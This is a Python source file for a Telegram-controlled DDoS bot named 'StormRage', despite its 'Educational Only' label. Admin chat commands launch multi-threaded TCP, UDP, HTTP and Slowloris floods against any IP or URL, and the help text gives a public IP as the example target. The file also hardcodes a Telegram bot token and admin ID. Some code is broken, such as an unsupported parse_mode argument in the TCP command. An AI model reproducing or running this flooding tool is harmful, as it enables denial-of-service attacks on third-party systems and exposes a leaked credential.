import socket
import threading
import requests
import random
import time
import asyncio
import aiohttp
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8957381735:AAE1OMZgYPQu5xqGmly3unK-ZL6IkraPDBQ"
ADMIN_IDS = [7898928200]

# Thread pool (limited to avoid Railway errors)
executor = ThreadPoolExecutor(max_workers=500)

# Active attacks storage
active_attacks = {}
attack_stats = {}
last_update_id = 0

print("=" * 50)
print("StormRage Bot Initializing...")
print(f"Bot Token: {BOT_TOKEN[:10]}...")
print(f"Admin ID: {ADMIN_IDS[0]}")
print("=" * 50)

# ==================== TELEGRAM API ====================
def tg_request(method, params=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        if params:
            r = requests.post(url, json=params, timeout=15)
        else:
            r = requests.get(url, timeout=15)
        return r.json()
    except Exception as e:
        print(f"API Error: {e}")
        return {"ok": False}

def send_message(chat_id, text):
    try:
        result = tg_request("sendMessage", {"chat_id": chat_id, "text": text})
        if result.get("ok"):
            print(f"Message sent to {chat_id}")
        return result
    except Exception as e:
        print(f"Send error: {e}")
        return None

def get_updates(offset=None):
    params = {"timeout": 30}
    if offset:
        params["offset"] = offset
    return tg_request("getUpdates", params)

# ==================== OPTIMIZED DDOS METHODS ====================

def tcp_attack(ip, port, chat_id, stop_event):
    """TCP Flood - Optimized"""
    sock = None
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
            sock.close()
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def udp_attack(ip, port, chat_id, stop_event):
    """UDP Flood - Optimized"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(random._urandom(4096), (ip, port))
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
        except:
            pass

def http_attack(url, chat_id, stop_event):
    """HTTP Flood - Optimized"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Mobile/15E148',
        'Googlebot/2.1 (+http://www.google.com/bot.html)'
    ]
    while not stop_event.is_set():
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(url, headers=headers, timeout=2, verify=False)
            with threading.Lock():
                attack_stats[chat_id] = attack_stats.get(chat_id, 0) + 1
        except:
            pass

def slowloris_attack(ip, port, chat_id, stop_event):
    """Slowloris - Optimized"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            for _ in range(50):
                if stop_event.is_set():
                    break
                sock.send(f"X-Keep: {random.randint(1,9999)}\r\n".encode())
                time.sleep(3)
            sock.close()
        except:
            pass

# ==================== ATTACK MANAGER ====================

def start_attack(chat_id, attack_type, target, port, threads):
    """Start attack with thread pool"""
    # Stop existing attack
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id].set()
        time.sleep(0.5)
    
    stop_event = threading.Event()
    active_attacks[chat_id] = stop_event
    attack_stats[chat_id] = 0
    
    # Limit threads to prevent Railway errors
    threads = min(threads, 300)
    
    for _ in range(threads):
        if attack_type == "tcp":
            executor.submit(tcp_attack, target, port, chat_id, stop_event)
        elif attack_type == "udp":
            executor.submit(udp_attack, target, port, chat_id, stop_event)
        elif attack_type == "http":
            executor.submit(http_attack, target, chat_id, stop_event)
        elif attack_type == "slow":
            executor.submit(slowloris_attack, target, port, chat_id, stop_event)
        elif attack_type == "all":
            executor.submit(tcp_attack, target, port, chat_id, stop_event)
            executor.submit(udp_attack, target, port, chat_id, stop_event)
            executor.submit(http_attack, f"http://{target}", chat_id, stop_event)
    
    return True

def stop_attack(chat_id):
    """Stop current attack"""
    if chat_id in active_attacks and active_attacks[chat_id]:
        active_attacks[chat_id].set()
        active_attacks[chat_id] = None
        return True
    return False

def get_attack_status(chat_id):
    """Get detailed attack status"""
    if chat_id in active_attacks and active_attacks[chat_id]:
        if not active_attacks[chat_id].is_set():
            packets = attack_stats.get(chat_id, 0)
            return "RUNNING", packets
    return "IDLE", attack_stats.get(chat_id, 0)

# ==================== BOT COMMANDS ====================

def cmd_start(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    msg = """🔥 *StormRage DDoS Bot* 🔥

*Commands:*
/tcp IP PORT THREADS - TCP Flood
/udp IP PORT THREADS - UDP Flood  
/http URL THREADS - HTTP Flood
/slow IP PORT THREADS - Slowloris
/all IP PORT THREADS - All Attacks
/stop - Stop Attack
/stats - Attack Status

*Examples:*
/tcp 185.31.40.28 80 200
/udp 185.31.40.28 80 200
/http http://example.com 200

⚠️ Educational Only
⚡ Max 300 threads (Railway limit)"""
    send_message(chat_id, msg)

def cmd_tcp(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /tcp IP PORT THREADS\nExample: /tcp 185.31.40.28 80 200")
        return
    try:
        ip = args[0]
        port = int(args[1])
        threads = min(int(args[2]), 300)
        start_attack(chat_id, "tcp", ip, port, threads)
        send_message(chat_id, f"✅ *TCP Attack Started!*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING", parse_mode="Markdown")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_udp(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /udp IP PORT THREADS\nExample: /udp 185.31.40.28 80 200")
        return
    try:
        ip = args[0]
        port = int(args[1])
        threads = min(int(args[2]), 300)
        start_attack(chat_id, "udp", ip, port, threads)
        send_message(chat_id, f"✅ *UDP Attack Started!*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_http(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 2:
        send_message(chat_id, "Usage: /http URL THREADS\nExample: /http http://example.com 200")
        return
    try:
        url = args[0]
        threads = min(int(args[1]), 300)
        start_attack(chat_id, "http", url, 0, threads)
        send_message(chat_id, f"✅ *HTTP Attack Started!*\nTarget: {url}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_slow(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /slow IP PORT THREADS\nExample: /slow 185.31.40.28 80 100")
        return
    try:
        ip = args[0]
        port = int(args[1])
        threads = min(int(args[2]), 150)
        start_attack(chat_id, "slow", ip, port, threads)
        send_message(chat_id, f"✅ *Slowloris Started!*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 ATTACKING")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_all(chat_id, user_id, args):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if len(args) < 3:
        send_message(chat_id, "Usage: /all IP PORT THREADS\nExample: /all 185.31.40.28 80 150")
        return
    try:
        ip = args[0]
        port = int(args[1])
        threads = min(int(args[2]), 150)
        start_attack(chat_id, "all", ip, port, threads)
        send_message(chat_id, f"✅ *ALL Attacks Started!*\nTarget: {ip}:{port}\nThreads: {threads}\nStatus: 🔴 MULTI-VECTOR ATTACK")
    except Exception as e:
        send_message(chat_id, f"Error: {str(e)}")

def cmd_stop(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    if stop_attack(chat_id):
        packets = attack_stats.get(chat_id, 0)
        send_message(chat_id, f"🛑 *Attack Stopped!*\nTotal Packets Sent: {packets:,}\nStatus: 🟢 IDLE")
    else:
        send_message(chat_id, "⚠️ No active attack to stop")

def cmd_stats(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        send_message(chat_id, "❌ Unauthorized")
        return
    status, packets = get_attack_status(chat_id)
    status_icon = "🔴 RUNNING" if status == "RUNNING" else "🟢 IDLE"
    send_message(chat_id, f"📊 *Attack Status*\n\nPackets Sent: `{packets:,}`\nStatus: {status_icon}\n\nUse /stop to halt attack")

# ==================== MAIN LOOP ====================
def main():
    global last_update_id
    
    print("🤖 Bot starting...")
    print(f"Bot Token: {BOT_TOKEN[:15]}...")
    
    # Test connection
    test = tg_request("getMe")
    if test.get("ok"):
        bot_info = test.get("result", {})
        print(f"✅ Bot connected: @{bot_info.get('username', 'unknown')}")
    else:
        print(f"❌ Connection failed: {test}")
        return
    
    # Notify admins
    for admin in ADMIN_IDS:
        send_message(admin, "✅ StormRage Bot is ONLINE and READY!")
    
    print("✅ Bot is running! Waiting for commands...")
    print("=" * 50)
    
    while True:
        try:
            response = get_updates(last_update_id + 1 if last_update_id else None)
            
            if response.get("ok") and response.get("result"):
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    
                    if "message" in update:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        user_id = msg["from"]["id"]
                        text = msg.get("text", "").strip()
                        
                        if not text.startswith("/"):
                            continue
                        
                        parts = text.split()
                        command = parts[0].lower()
                        args = parts[1:]
                        
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] {command} from {user_id}")
                        
                        if command == "/start":
                            cmd_start(chat_id, user_id)
                        elif command == "/tcp":
                            cmd_tcp(chat_id, user_id, args)
                        elif command == "/udp":
                            cmd_udp(chat_id, user_id, args)
                        elif command == "/http":
                            cmd_http(chat_id, user_id, args)
                        elif command == "/slow":
                            cmd_slow(chat_id, user_id, args)
                        elif command == "/all":
                            cmd_all(chat_id, user_id, args)
                        elif command == "/stop":
                            cmd_stop(chat_id, user_id)
                        elif command == "/stats":
                            cmd_stats(chat_id, user_id)
                        else:
                            send_message(chat_id, "❌ Unknown command. Send /start")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()